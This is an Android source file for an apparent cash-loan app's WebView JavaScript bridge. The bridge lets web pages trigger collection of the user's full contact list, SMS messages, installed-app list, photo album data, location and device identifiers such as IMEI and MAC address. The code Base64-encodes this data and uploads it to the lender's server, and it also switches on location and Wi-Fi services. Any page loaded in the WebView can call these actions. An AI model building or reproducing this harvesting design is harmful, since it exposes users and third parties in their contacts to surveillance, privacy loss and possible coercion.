package com.grew.sw.cashlawn.web;

import static android.app.Activity.RESULT_OK;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebView;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;

import com.blankj.utilcode.util.DeviceUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ToastUtils;
import com.blankj.utilcode.util.Utils;
import com.google.gson.Gson;
import com.grew.sw.cashlawn.App;
import com.grew.sw.cashlawn.model.AlbumInfoModel;
import com.grew.sw.cashlawn.model.AppListInfoModel;
import com.grew.sw.cashlawn.model.AppsFlyerModel;
import com.grew.sw.cashlawn.model.AuthInfoModel;
import com.grew.sw.cashlawn.model.ContactInfoModel;
import com.grew.sw.cashlawn.model.DeviceInfoModel;
import com.grew.sw.cashlawn.model.ImageResponse;
import com.grew.sw.cashlawn.model.JSCommonJSModel;
import com.grew.sw.cashlawn.model.JsBridgeCallBackModel;
import com.grew.sw.cashlawn.model.JsBridgeModel;
import com.grew.sw.cashlawn.model.LocationBean;
import com.grew.sw.cashlawn.model.SmsInfoModel;
import com.grew.sw.cashlawn.model.UserInfoResponse;
import com.grew.sw.cashlawn.network.NetCallback;
import com.grew.sw.cashlawn.network.NetClient;
import com.grew.sw.cashlawn.network.NetErrorModel;
import com.grew.sw.cashlawn.network.NetUtil;
import com.grew.sw.cashlawn.util.AuthDataUtil;
import com.grew.sw.cashlawn.util.ComUtil;
import com.grew.sw.cashlawn.util.DateUtil;
import com.grew.sw.cashlawn.util.DeviceInfoUtil;
import com.grew.sw.cashlawn.util.IActivityManager;
import com.grew.sw.cashlawn.util.ImageDataUtil;
import com.grew.sw.cashlawn.util.LoadingUtil;
import com.grew.sw.cashlawn.util.SpecialPermissionUtil;
import com.grew.sw.cashlawn.util.UserInfoUtil;
import com.grew.sw.cashlawn.view.SignActivity;
import com.grew.sw.cashlawn.view.WebActivity;
import com.hjq.permissions.OnPermissionCallback;
import com.hjq.permissions.Permission;
import com.hjq.permissions.XXPermissions;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class WebJsBridge {
    private WebView mWebView;
    private Context mContext;
    private Handler mainHandler;
    private ImageDataUtil imageDataUtil;
    private JsBridgeModel selectContactJsBridgeModel;
    private JsBridgeModel tackPhotoJsBridgeModel;
    private File photoFile;
    private final static int REQUEST_SELECT_CONTACTS = 2323;
    private final static int REQUEST_TACK_PHOTO = 2324;
    private final String TAG = "WebJsBridge";
    public static final String APPUSERINFO = "appUserInfo";
    public static final String APPCOPYCLIP = "appCopyClip";
    public static final String APPSIGNOUT = "appSignOut";
    public static final String APPDEVICEINFO = "appDeviceInfo";
    public static final String APPINSTALLATIONINFO = "appInstallationInfo";
    public static final String APPLOCATIONINFO = "appLocationInfo";
    public static final String APPSMSINFO = "appSmsInfo";
    public static final String APPALBUMINFO = "appAlbumInfo";
    public static final String APPCONTACTINFO = "appContactInfo";
    public static final String APPSELECTCONTACT = "appSelectContact";
    public static final String APPCALLPHONE = "appCallPhone";
    public static final String APPAPPSFLYER = "appAppsFlyer";
    public static final String APPTACKPHOTO = "appTackPhoto";
    public static final String APPFORWARD = "appForward";
    public static final String APPSERVICETIME = "appServiceTime";


    public WebJsBridge(Context context, WebView webView) {
        mContext = context;
        mWebView = webView;
        mainHandler = new Handler(Looper.getMainLooper());
    }

    @JavascriptInterface
    public void appData(String json) {
        LogUtils.d(TAG, "----- appData :" + json);
        mWebView.post(() -> {
            try {
                JsBridgeModel jsBridgeModel = new Gson().fromJson(json, JsBridgeModel.class);
                switch (jsBridgeModel.getAppAction()) {
                    case APPUSERINFO:
                        //用户信息
                        getUserJson(jsBridgeModel);
                        break;
                    case APPCOPYCLIP:
                        //复制到剪贴版
                        copy(jsBridgeModel);
                        break;
                    case APPSIGNOUT:
                        //退出登录
                        logout(jsBridgeModel);
                        break;
                    case APPDEVICEINFO:
                        //设备信息
                        deviceInfo(jsBridgeModel);
                        break;
                    case APPINSTALLATIONINFO:
                        //安装信息
                        installAppList(jsBridgeModel);
                        break;
                    case APPLOCATIONINFO:
                        //定位信息
                        locationInfo(jsBridgeModel);
                        break;
                    case APPSMSINFO:
                        //短信信息
                        smsInfo(jsBridgeModel);
                        break;
                    case APPALBUMINFO:
                        //相册信息
                        albumInfo(jsBridgeModel);
                        break;
                    case APPCONTACTINFO:
                        //通讯录信息
                        contactInfo(jsBridgeModel);
                        break;
                    case APPSELECTCONTACT:
                        //选择通讯录
                        selectContact(jsBridgeModel);
                        break;
                    case APPCALLPHONE:
                        //拨打电话
                        callPhone(jsBridgeModel);
                        break;
                    case APPAPPSFLYER:
                        //埋点
                        appsFlyer(jsBridgeModel);
                        break;
                    case APPTACKPHOTO:
                        //拍照
                        tackPhoto(jsBridgeModel);
                        break;
                    case APPFORWARD:
                        //跳转新页面
                        openNewView(jsBridgeModel);
                        break;
                    case APPSERVICETIME:
                        //获取系统时间
                        appServiceTime(jsBridgeModel);
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

    }

    /**
     * 获取系统时间
     *
     * @param jsBridgeModel
     */
    private void appServiceTime(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            DateUtil.initTime(jsCommonJSModel.getValue());
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }
    }

    /**
     * 开启新页面
     *
     * @param jsBridgeModel
     */
    private void openNewView(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            WebActivity.openWeb((Activity) mContext, false, jsCommonJSModel.getValue());
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }
    }

    /**
     * 拍照
     *
     * @param jsBridgeModel
     */
    private void tackPhoto(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.Group.STORAGE)
                .permission(Permission.CAMERA)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            tackPhotoJsBridgeModel = jsBridgeModel;
                            Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                            photoFile = new File(ComUtil.getImageDir(), DateUtil.getServerTimestamp() + ".jpg");
                            Uri mImageUri;
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                //兼容7.0以上
                                String authority = App.get().getPackageName() + ".provider";
                                mImageUri = FileProvider.getUriForFile(App.get(), authority, photoFile);
                            } else {
                                mImageUri = Uri.fromFile(photoFile);
                            }
                            takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mImageUri);
                            takePictureIntent.putExtra("android.intent.extra.USE_FRONT_CAMERA", true);
                            takePictureIntent.putExtra("android.intent.extras.CAMERA_FACING", 1);
                            takePictureIntent.putExtra("android.intent.extras.LENS_FACING_FRONT", 1);
                            ((Activity) mContext).startActivityForResult(takePictureIntent, REQUEST_TACK_PHOTO);
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 埋点
     *
     * @param jsBridgeModel
     */
    private void appsFlyer(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            AppsFlyerModel appsFlyerModel = new Gson().fromJson(jsonData.toString(), AppsFlyerModel.class);
            ComUtil.appsFlyer(appsFlyerModel.getEventName());
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), null);
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }

    }

    private void callPhone(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + jsCommonJSModel.getValue()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            mContext.startActivity(intent);
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), null);
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "value is null");
        }
    }

    /**
     * 选择通讯录
     *
     * @param jsBridgeModel
     */
    private void selectContact(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_CONTACTS)
                .permission(Permission.GET_ACCOUNTS)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            selectContactJsBridgeModel = jsBridgeModel;
                            ((Activity) mContext).startActivityForResult(new Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI), REQUEST_SELECT_CONTACTS);
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 通讯录信息
     *
     * @param jsBridgeModel
     */
    private void contactInfo(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_CONTACTS)
                .permission(Permission.GET_ACCOUNTS)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            new Thread(() -> {
                                ArrayList<ContactInfoModel> contactInfoModels = AuthDataUtil.getContactInfoModels();
                                LogUtils.d("通讯录信息：\n" + contactInfoModels.toString());
                                pushAuthData(jsBridgeModel, contactInfoModels, null, null, null, null, null);
                            }).start();
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 相册信息
     *
     * @param jsBridgeModel
     */
    private void albumInfo(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.Group.STORAGE)
                .permission(Permission.READ_PHONE_STATE)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            if (imageDataUtil == null) {
                                imageDataUtil = new ImageDataUtil();
                            }
                            imageDataUtil.start((AppCompatActivity) mContext, albumInfoModels -> {
                                imageDataUtil.unLoadedListener();
                                LogUtils.d("相册信息：\n" + albumInfoModels.size() + albumInfoModels.toString());
                                pushAuthData(jsBridgeModel, null, null, null, null, null, albumInfoModels);
                            });
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 短信信息
     *
     * @param jsBridgeModel
     */
    private void smsInfo(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_PHONE_STATE)
                .permission(Permission.READ_SMS)
                .permission(Permission.READ_CONTACTS)
                .permission(Permission.GET_ACCOUNTS)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            new Thread(() -> {
                                ArrayList<SmsInfoModel> smsBeans = AuthDataUtil.getSmsInfo();
                                if (smsBeans != null) {
                                    LogUtils.d("短信信息：\n" + smsBeans.toString());
                                }
                                pushAuthData(jsBridgeModel, null, null, null, null, smsBeans, null);
                            }).start();
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 位置信息
     *
     * @param jsBridgeModel
     */
    private void locationInfo(JsBridgeModel jsBridgeModel) {
        SpecialPermissionUtil.openLocService();
        XXPermissions.with(mContext)
                .permission(Permission.READ_PHONE_STATE)
                .permission(Permission.ACCESS_FINE_LOCATION)
                .permission(Permission.ACCESS_COARSE_LOCATION)
                .request(new OnPermissionCallback() {

                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all && SpecialPermissionUtil.isLocServiceEnable()) {
                            Location location = null;
                            LocationManager locationManager = (LocationManager) App.get().getSystemService(Context.LOCATION_SERVICE);
                            if (locationManager == null) {
                                callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                                return;
                            }
                            List<String> providers = locationManager.getProviders(true);
                            for (String provider : providers) {
                                @SuppressLint("MissingPermission")
                                Location l = locationManager.getLastKnownLocation(provider);
                                if (l == null) {
                                    continue;
                                }
                                if (location == null || l.getAccuracy() < location.getAccuracy()) {
                                    location = l;
                                }
                            }
                            List<LocationBean> geoBeans = new ArrayList<>();
                            LocationBean geoBean = new LocationBean();
                            if (location != null) {
                                geoBean.setLatitude(location.getLatitude() + "");
                                geoBean.setLongtitude(location.getLongitude() + "");
                                geoBean.setGeo_time(DateUtil.getCurrentDate());
                                Geocoder geocoder = new Geocoder(Utils.getApp(), Locale.getDefault());
                                try {
                                    List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                                    if (addresses.size() > 0) {
                                        Address address = addresses.get(0);
                                        geoBean.setLocation(address == null ? "unknown" : address.getAddressLine(0));
                                    }
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                geoBeans.add(geoBean);
                            }
                            LogUtils.d("位置信息：" + geoBeans.toString());
                            pushAuthData(jsBridgeModel, null, null, null, geoBeans, null, null);
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });

    }

    /**
     * app安装信息
     *
     * @param jsBridgeModel
     */
    private void installAppList(JsBridgeModel jsBridgeModel) {
        XXPermissions.with(mContext)
                .permission(Permission.READ_PHONE_STATE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            new Thread(() -> {
                                try {
                                    ArrayList<AppListInfoModel> appListBeans = new ArrayList<>();
                                    List<ApplicationInfo> allApps = App.get().getPackageManager().getInstalledApplications(0);
                                    for (ApplicationInfo ai : allApps) {
                                        PackageInfo packageInfo = App.get().getPackageManager().getPackageInfo(ai.packageName, 0);
                                        AppListInfoModel appListBean = new AppListInfoModel();
                                        appListBean.setLastUpdateTime(DateUtil.getTimeFromLongYMDHMS(packageInfo.lastUpdateTime));
                                        appListBean.setPackageName(packageInfo.packageName);
                                        appListBean.setAppName(packageInfo.applicationInfo.loadLabel(App.get().getPackageManager()).toString());
                                        appListBean.setVersion(packageInfo.versionName);
                                        appListBean.setInstallationTime(DateUtil.getTimeFromLongYMDHMS(packageInfo.firstInstallTime));
                                        if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                                            //非系统
                                            appListBean.setIs_system("1");
                                        } else {
                                            appListBean.setIs_system("2");
                                        }
                                        appListBeans.add(appListBean);
                                    }
                                    LogUtils.d("安装信息：\n" + appListBeans.toString());
                                    pushAuthData(jsBridgeModel, null, null, appListBeans, null, null, null);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                                }
                            }).start();
                        } else {
                            callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });

    }

    /**
     * 设备信息
     *
     * @param jsBridgeModel
     */
    private void deviceInfo(JsBridgeModel jsBridgeModel) {
        SpecialPermissionUtil.openLocService();
        SpecialPermissionUtil.openWifi();
        XXPermissions.with(mContext)
                .permission(Permission.ACCESS_FINE_LOCATION)
                .permission(Permission.ACCESS_COARSE_LOCATION)
                .permission(Permission.READ_PHONE_STATE)
                .request(new OnPermissionCallback() {
                    @Override
                    public void onGranted(List<String> permissions, boolean all) {
                        if (all) {
                            if (!SpecialPermissionUtil.isLocServiceEnable() || !SpecialPermissionUtil.isOpenWifi()) {
                                callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                            } else {
                                new Thread() {
                                    @Override
                                    public void run() {
                                        LogUtils.d("开始延迟获取");
                                        try {
                                            Thread.sleep(2000);
                                        } catch (InterruptedException e) {
                                            e.printStackTrace();
                                        }
                                        LogUtils.d("----------开启获取数据");
                                        DeviceInfoModel deviceBean = new DeviceInfoModel();
                                        try {
                                            deviceBean.setRegDevice("4");
                                            deviceBean.setRegWifiAddress(DeviceInfoUtil.getWifiInfo());
                                            deviceBean.setWifiList(DeviceInfoUtil.getWifiList());
                                            deviceBean.setImei(DeviceInfoUtil.getIMEI());
                                            deviceBean.setImsi(Settings.Secure.getString(App.get().getContentResolver(), Settings.Secure.ANDROID_ID));
                                            deviceBean.setDeviceName(Settings.Secure.getString(App.get().getContentResolver(), "bluetooth_name"));
                                            deviceBean.setPhoneModel(Build.MODEL);
                                            deviceBean.setPhoneVersion(android.os.Build.VERSION.RELEASE);
                                            deviceBean.setMacAddress(DeviceUtils.getMacAddress());
                                            deviceBean.setAvailableSpace(DeviceInfoUtil.getAvailableSpace());
                                            deviceBean.setTotalRam(DeviceInfoUtil.getTotalRam());
                                            deviceBean.setSensorCount(DeviceInfoUtil.getSensorCount());
                                            deviceBean.setIsRooted(DeviceUtils.isDeviceRooted() ? "1" : "0");
                                            deviceBean.setBasebandVer(DeviceInfoUtil.getBasebandVer());
                                            deviceBean.setScreenResolution(DeviceInfoUtil.getScreenResolution());
                                            deviceBean.setDeviceCreateTime(DateUtil.getTimeFromLongYMDHMS(DateUtil.getServerTimestamp()));
                                            deviceBean.setIp(DeviceInfoUtil.getIPAddress());
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                        LogUtils.d("设备信息：\n" + deviceBean.toString());
                                        pushAuthData(jsBridgeModel, null, deviceBean, null, null, null, null);
                                    }
                                }.start();
                            }
                        }
                    }

                    @Override
                    public void onDenied(List<String> permissions, boolean never) {
                        callJSFailP(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId());
                    }
                });
    }

    /**
     * 退出登录
     *
     * @param jsBridgeModel
     */
    private void logout(JsBridgeModel jsBridgeModel) {
        NetClient.getNewService().logout()
                .compose(NetUtil.applySchedulers())
                .doOnSubscribe(disposable -> LoadingUtil.show())
                .doFinally(() -> LoadingUtil.dismiss())
                .subscribe(new NetCallback() {
                    @Override
                    public void businessFail(NetErrorModel netErrorModel) {
                        ToastUtils.showShort(netErrorModel.getMessage());
                    }

                    @Override
                    public void businessSuccess(Object data) {
                        UserInfoUtil.logout();
                        Intent intent = new Intent(mContext, SignActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
                        mContext.startActivity(intent);
                    }
                });
    }

    /**
     * 复制
     *
     * @param jsBridgeModel
     */
    private void copy(JsBridgeModel jsBridgeModel) {
        try {
            Map<String, Object> data = jsBridgeModel.getAppData();
            JSONObject jsonData = new JSONObject(data);
            JSCommonJSModel jsCommonJSModel = new Gson().fromJson(jsonData.toString(), JSCommonJSModel.class);
            ClipboardManager manager = (ClipboardManager) App.get().getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clipData = ClipData.newPlainText("", jsCommonJSModel.getValue());
            manager.setPrimaryClip(clipData);
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), null);
        } catch (Exception e) {
            e.printStackTrace();
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "userInfo is null");
        }

    }

    /**
     * 获取用户信息
     *
     * @param jsBridgeModel
     */
    private void getUserJson(JsBridgeModel jsBridgeModel) {
        UserInfoResponse.Data userInfo = UserInfoUtil.getUserInfo();
        if (userInfo == null) {
            callJSFailOther(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), "userInfo is null");
        } else {
            callJSSuccess(jsBridgeModel.getAppAction(), jsBridgeModel.getAppActionId(), new Gson().toJson(userInfo));
        }
    }


    private void pushAuthData(JsBridgeModel models, List<ContactInfoModel> contactBeanList
            , DeviceInfoModel deviceBean
            , List<AppListInfoModel> appListBeanList, List<LocationBean> geoBeanList, List<SmsInfoModel> smsBeanList
            , List<AlbumInfoModel> albumBeanList) {
        Map<String, String> map = new HashMap<>();
        AuthInfoModel authInfoModel = new AuthInfoModel(albumBeanList, appListBeanList, contactBeanList, smsBeanList, deviceBean, geoBeanList);
        String content = new Gson().toJson(authInfoModel);
        map.put("authInfo", Base64.encodeToString(content.getBytes(), Base64.DEFAULT));
        NetClient.getNewService()
                .uploadCocoLoanWardAuth(map)
                .compose(NetUtil.applySchedulers())
                .subscribe(new NetCallback<UserInfoResponse>() {
                    @Override
                    public void businessFail(NetErrorModel netErrorModel) {
                        callJSFailNet(models.getAppAction(), models.getAppActionId(), netErrorModel.getMessage());
                    }

                    @Override
                    public void businessSuccess(UserInfoResponse data) {
                        if (200 == data.getCode()) {
                            callJSSuccess(models.getAppAction(), models.getAppActionId(), null);
                        } else {
                            callJSFailNet(models.getAppAction(), models.getAppActionId(), data.getMessage());
                        }
                    }
                });
    }


    private void callJSFailOther(String appAction, String appActionId, String error) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("999");
        model.setErrorMsg(error);
        callJS(model);
    }


    private void callJSFailP(String appAction, String appActionId) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("2");
        callJS(model);
    }

    private void callJSFailNet(String appAction, String appActionId, String error) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("1");
        model.setErrorMsg(error);
        callJS(model);
    }

    private void callJSSuccess(String appAction, String appActionId, String data) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("0");
        model.setAppData(data);
        callJS(model);
    }

    public void callJS(JsBridgeCallBackModel model) {
        mWebView.post(() -> {
            try {
                final String js = String.format("javascript: window.appCallback && window.appCallback(%1$s);", new Gson().toJson(model));
                LogUtils.d(TAG, "----- appData回传：" + js);
                mWebView.evaluateJavascript(js, null);
            } catch (Throwable w) {
                w.printStackTrace();
            }
        });
    }

    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_SELECT_CONTACTS) {
            if (resultCode == RESULT_OK) {
                try {
                    ContactInfoModel contactInfoModel = new ContactInfoModel();
                    Uri contactData = data.getData();
                    Cursor cursor = App.get().getContentResolver().query(contactData, null, null, null, null);
                    if (cursor != null) {
                        cursor.moveToFirst();
                        contactInfoModel.name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        Cursor phone = App.get().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = "
                                        + cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)), null, null);
                        if (phone != null) {
                            phone.moveToNext();
                            contactInfoModel.mobile = phone.getString(phone.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phone.close();
                        }
                        cursor.close();
                        LogUtils.d("选择通讯录信息：\n" + contactInfoModel.toString());
                        callJSSuccess(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), new Gson().toJson(contactInfoModel));
                    } else {
                        callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), "null");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), e.toString());
                }
            } else {
                callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), "cancel selection");
            }
        } else if (requestCode == REQUEST_TACK_PHOTO) {
            if (resultCode == RESULT_OK) {
                LoadingUtil.show();
                new Thread(() -> {
                    File file = null;
                    if (photoFile != null) {
                        LogUtils.d("压缩前：" + photoFile.length());
                        file = ComUtil.compressImage(photoFile.getAbsolutePath());
                        LogUtils.d("压缩后：" + file.length());
                    }
                    if (file == null) {
                        LoadingUtil.dismiss();
                        callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "file is null");
                        return;
                    }
                    RequestBody imageBody = RequestBody.create(MediaType.parse("multipart/form-data"), file);
                    MultipartBody.Part txtBodyPart = MultipartBody.Part.createFormData("type", "jpg");
                    MultipartBody.Part imageBodyPart = MultipartBody.Part.createFormData("file", file.getName(), imageBody);
                    Call<ImageResponse> repos = NetClient.getNewService().uploadImg(txtBodyPart, imageBodyPart);
                    repos.enqueue(new Callback<ImageResponse>() {
                        @Override
                        public void onResponse(Call<ImageResponse> call, Response<ImageResponse> response) {
                            LoadingUtil.dismiss();
                            try {
                                if (response.code() == 200) {
                                    JSCommonJSModel jsCommonJSModel = new JSCommonJSModel();
                                    jsCommonJSModel.setValue(response.body().getData());
                                    callJSSuccess(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), new Gson().toJson(jsCommonJSModel));
                                } else {
                                    callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), response.message());
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
                            }
                        }

                        @Override
                        public void onFailure(Call<ImageResponse> call, Throwable t) {
                            LoadingUtil.dismiss();
                            callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), t.toString());
                        }
                    });
                }).start();
            } else {
                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "cancel selection");
            }
        }
    }
}
